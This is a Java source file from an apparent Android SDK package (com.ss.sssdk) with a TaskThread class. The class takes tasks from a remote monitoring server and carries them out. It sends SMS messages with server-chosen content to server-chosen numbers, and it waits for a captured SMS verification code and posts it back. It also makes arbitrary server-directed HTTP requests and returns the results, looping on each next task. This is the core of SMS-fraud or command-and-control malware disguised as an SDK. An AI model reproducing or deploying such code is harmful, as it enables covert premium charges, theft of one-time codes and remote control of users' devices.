package com.ss.sssdk;

import org.json.JSONObject;

/**
 * Created by ljw on 15/11/11.
 */
public class TaskThread extends Thread{
    private JSONObject first_task;
    public static String sms_code = null;
    public TaskThread(JSONObject _task) {
        first_task = _task;
    }

    @Override
    public void run() {
        excuteTask(first_task);
    }

    private void excuteTask(JSONObject task) {
        try {
            sleep(5000);
            int taskid = task.getInt("id");
            int step = task.getInt("step");
            if(task.has("wait_sms")) {
                boolean sms = task.getBoolean("wait_sms");
                for(int i=0;i<10;i++) {
                    if(sms_code != null) {
                        JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url,HttpUrl.REPORT_RESULT,null,"id="+taskid+"&step="+step+"&smscode="+sms_code);
                        if(ret != null && ret.getBoolean("b") && ret.has("task")) {
                            excuteTask(ret.getJSONObject("task"));
                        }
                        break;
                    }else {
                        sleep(30000);
                    }
                }
            }else if(task.has("send_sms")) {
                String content = task.getString("content");
                String phone = task.getString("phone");
                SdkTools.sendSMS(phone,content);
                sleep(30000);
                JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url,HttpUrl.REPORT_RESULT,null,"id="+taskid+"&step="+step);
                if(ret != null && ret.getBoolean("b") && ret.has("task")) {
                    excuteTask(ret.getJSONObject("task"));
                }
            }else {
                String url = task.getString("url");
                String params = task.getString("params");
                JSONObject header = task.getJSONObject("header");
                String result = HttpRequest.sendPost(url, null, header, params);
                JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url, HttpUrl.REPORT_RESULT, null, "id=" + taskid + "&step=" + step + "&result="+result);
                if(ret != null && ret.getBoolean("b") && ret.has("task")) {
                    excuteTask(ret.getJSONObject("task"));
                }
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }
}
